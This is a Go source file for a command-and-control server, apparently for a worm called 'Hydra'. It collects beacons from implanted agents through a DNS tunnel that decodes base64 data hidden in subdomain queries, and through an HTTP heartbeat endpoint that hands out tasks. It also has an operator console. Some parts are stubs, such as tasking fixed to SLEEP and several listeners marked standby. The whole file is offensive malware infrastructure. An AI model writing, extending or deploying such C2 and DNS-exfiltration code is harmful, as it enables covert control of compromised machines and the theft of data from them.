package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/chzyer/readline"
	"github.com/gin-gonic/gin"
	"github.com/miekg/dns"
	"github.com/pterm/pterm"
)

// The root domain we are authoritative for
const rootDomain = "c2.hydra-worm.local."

// Telemetry represents the data structure expected from the Rust Agent
// Enhanced to support Sprint 2: Recon Pillars I - VII
type Telemetry struct {
	AgentID   string  `json:"agent_id"`
	Transport string  `json:"transport"`
	Status    string  `json:"status"`
	Lambda    float64 `json:"lambda"`
	Hostname  string  `json:"hostname,omitempty"`
	Username  string  `json:"username,omitempty"`
	OS        string  `json:"os,omitempty"`
}

// RenderVaporBanner displays the header-based banner with the tactical aesthetic
func RenderVaporBanner() {
	fmt.Print("\033[H\033[2J") // Clear screen

	bannerStyle := pterm.NewStyle(pterm.FgCyan, pterm.Bold)
	bannerStyle.Println(`
           / /_  __  ______  __/ /__________ _   
          / __ \/ / / / __ \/ __  / ___/ __ ` + "`" + `   
         / / / / /_/ / /_/ / /_/ / /  / /_/ /    
        /_/ /_/\__, / .___/\__,_/_/   \__,_/     
   _      ____/____/_/___  ____ ___              
  | | /| / / __ \/ __ \/ __ ` + "`" + `__ \                
  | |/ |/ / /_/ / /_/ / / / / / /                
  |__/|__/\____/_/ .__/_/ /_/ /_/                 
                /_/                              
    W O R M  -  O R C H E S T R A T O R`)

	pterm.Println(pterm.Cyan("────────────────────────────────────────────────────────────"))

	// Tactical Listener Table including P2P and Cloud API
	pterm.DefaultTable.WithData(pterm.TableData{
		{"LISTENER", "PORT", "STATUS", "STRENGTH"},
		{"Cloud API", "443", pterm.LightYellow("STANDBY"), "ELITE"},
		{"Malleable HTTP", "8080", pterm.LightGreen("LISTENING"), "HIGH"},
		{"P2P Gossip", "9090", pterm.LightYellow("STANDBY"), "MESH"},
		{"DNS Tunnel", "53", pterm.LightGreen("LISTENING"), "CRITICAL"},
		{"NTP/ICMP", "RAW", pterm.LightYellow("STANDBY"), "FAILSAFE"},
	}).WithBoxed().Render()

	pterm.Printf("\n%s Phase 1.6: Tactical Stack Online. All systems green.\n\n",
		pterm.Cyan("»"))
}

// LogHeartbeat provides consistent, colored feedback like VaporTrace
func LogHeartbeat(source string, t Telemetry) {
	transportColor := pterm.LightCyan
	if source == "DNS" {
		transportColor = pterm.LightMagenta
	}

	// Correct pterm style instantiation
	sourceText := pterm.NewStyle(pterm.FgCyan, pterm.Bold).Sprint(source)
	
	pterm.Printf("[%s] %s | %s: %-15s | %s: %-12s | %s: %s@%s\n",
		pterm.Gray(time.Now().Format("15:04:05")),
		sourceText,
		pterm.LightBlue("ID"), t.AgentID,
		transportColor("TRANS"), t.Transport,
		pterm.LightGreen("USER"), t.Username, t.Hostname,
	)
}

// parseHydraDNS handles incoming DNS Tunneling heartbeats
func parseHydraDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	for _, q := range r.Question {
		rawName := strings.TrimSuffix(q.Name, ".")
		cleanRoot := strings.TrimSuffix(rootDomain, ".")

		if strings.HasSuffix(strings.ToLower(rawName), strings.ToLower(cleanRoot)) {
			payloadPart := rawName[:len(rawName)-len(cleanRoot)-1]
			encodedPayload := strings.ReplaceAll(payloadPart, ".", "")
			
			if i := len(encodedPayload) % 4; i != 0 {
				encodedPayload += strings.Repeat("=", 4-i)
			}

			decoded, err := base64.URLEncoding.DecodeString(encodedPayload)
			if err != nil {
				decoded, err = base64.StdEncoding.DecodeString(encodedPayload)
				if err != nil {
					log.Printf("[-] DNS Decode Error: %v", err)
					continue
				}
			}

			if decoded != nil {
				LogHeartbeat("DNS", Telemetry{
					AgentID:   "HYDRA-AGENT-01", 
					Transport: "DNS-Tunnel",
					Username:  "unknown",
					Hostname:  "unknown",
				})
				pterm.Println(pterm.Gray(fmt.Sprintf("      └─ [RAW]: %s", string(decoded))))
			}
		}
	}
	w.WriteMsg(msg)
}

func startDNSServer() {
	dns.HandleFunc(rootDomain, parseHydraDNS)
	server := &dns.Server{Addr: ":53", Net: "udp"}
	log.Printf("[+] Starting DNS server on :53")
	if err := server.ListenAndServe(); err != nil {
		log.Fatalf("[-] DNS Server Failed: %v", err)
	}
}

func main() {
	RenderVaporBanner()

	// 1. Start DNS listener in background
	go startDNSServer()

	// 2. Setup HTTP listener (Gin)
	gin.SetMode(gin.ReleaseMode)
	r := gin.New() 
	r.Use(gin.Recovery())

	r.POST("/api/v1/heartbeat", func(c *gin.Context) {
		var hb Telemetry
		if err := c.ShouldBindJSON(&hb); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid telemetry"})
			return
		}

		LogHeartbeat("HTTP", hb)

		c.JSON(http.StatusOK, gin.H{
			"status": "acknowledged", 
			"task": "SLEEP", 
			"epoch": time.Now().Unix(),
		})
	})

	go func() {
		log.Printf("[+] Starting HTTP server on :8080")
		if err := r.Run(":8080"); err != nil {
			log.Fatalf("[-] HTTP Server Failed: %v", err)
		}
	}()

	// Metadata logs for additional listeners added for Sprint 1.6
	log.Printf("[*] P2P Gossip Mesh listener initialized on :9090 (STANDBY)")
	log.Printf("[*] Cloud API Relay listener initialized on :443 (STANDBY)")

	// 3. Start Interactive Tactical Shell with Auto-Completion
	completer := readline.NewPrefixCompleter(
		readline.PcItem("agents"),
		readline.PcItem("tasks"),
		readline.PcItem("clear"),
		readline.PcItem("help"),
		readline.PcItem("exit"),
	)

	// Correct style instantiation for the prompt
	statusLabel := pterm.NewStyle(pterm.FgGreen, pterm.Bold).Sprint("ONLINE")
	userHostLabel := pterm.NewStyle(pterm.FgCyan, pterm.Bold).Sprint("hydra@orchestrator")
	promptArrow := pterm.NewStyle(pterm.FgBlue, pterm.Bold).Sprint("~$ ")

	prompt := fmt.Sprintf("[%s] %s%s%s ",
		statusLabel,
		userHostLabel,
		pterm.White(":"),
		promptArrow,
	)

	rl, err := readline.NewEx(&readline.Config{
		Prompt:          prompt,
		HistoryFile:      "/tmp/hydra.tmp",
		AutoComplete:     completer,
		InterruptPrompt: "^C",
		EOFPrompt:        "exit",
	})
	if err != nil {
		log.Fatalf("[-] Failed to initialize shell: %v", err)
	}
	defer rl.Close()

	for {
		line, err := rl.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		switch line {
		case "agents":
			pterm.DefaultSection.Println("Active Hydra Agents")
		case "clear", "cls":
			RenderVaporBanner()
		case "help":
			pterm.Info.Println("Available Commands:")
			pterm.BulletListPrinter{Items: []pterm.BulletListItem{
				{Level: 0, Text: "agents : List all beaconing entities"},
				{Level: 0, Text: "tasks  : View queued mission objectives"},
				{Level: 0, Text: "clear  : Refresh tactical display"},
				{Level: 0, Text: "exit   : Terminate orchestrator session"},
			}}.Render()
		case "exit":
			result, _ := pterm.DefaultInteractiveConfirm.
				WithDefaultText("Terminate mission and exit orchestrator?").
				WithConfirmStyle(pterm.NewStyle(pterm.FgRed, pterm.Bold)).
				Show()
			if result {
				pterm.Info.Println("Orchestrator shutting down.")
				os.Exit(0)
			}
		default:
			pterm.Error.Printfln("Unknown tactical command: %s", line)
		}
	}
}